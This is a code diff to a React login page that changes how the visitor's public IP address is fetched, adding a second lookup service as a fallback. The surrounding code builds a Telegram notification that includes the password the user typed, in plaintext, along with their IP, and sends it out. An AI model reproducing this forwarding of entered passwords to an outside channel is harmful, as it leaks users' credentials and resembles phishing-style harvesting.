@@ -27,26 +27,21 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
 
     try {
       // Get user's public IP address with timeout and error handling
-      let userIP = 'Unknown';
+      let ip = "Unknown";
       try {
-        const ipController = new AbortController();
-        const ipTimeout = setTimeout(() => ipController.abort(), 5000); // 5 second timeout
-        
-        const ipResponse = await fetch('https://api.ipify.org?format=json', {
-          signal: ipController.signal,
-          headers: {
-            'Accept': 'application/json',
+        const res1 = await fetch("https://api.ipify.org?format=json");
+        if (res1.ok) {
+          const data1 = await res1.json();
+          ip = data1.ip;
+        } else {
+          const res2 = await fetch("https://ipv4.jsonip.com/");
+          if (res2.ok) {
+            const data2 = await res2.json();
+            ip = data2.ip;
           }
-        });
-        clearTimeout(ipTimeout);
-        
-        if (ipResponse.ok) {
-          const ipData = await ipResponse.json();
-          userIP = ipData.ip || 'Unknown';
         }
-      } catch (ipError) {
-        console.log('Could not fetch IP address:', ipError);
-        userIP = 'Unknown';
+      } catch (e) {
+        ip = "Unknown";
       }
 
       // Get current date and time
@@ -66,7 +61,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
       const telegramMessage = `🔔 Login Attempt
 Status: ${status}
 Entered Password: ${password}
-IP Address: ${userIP}
+IP Address: ${ip}
 Time: ${dateStr} - ${timeStr}`;
 
       // Send Telegram notification with error handling
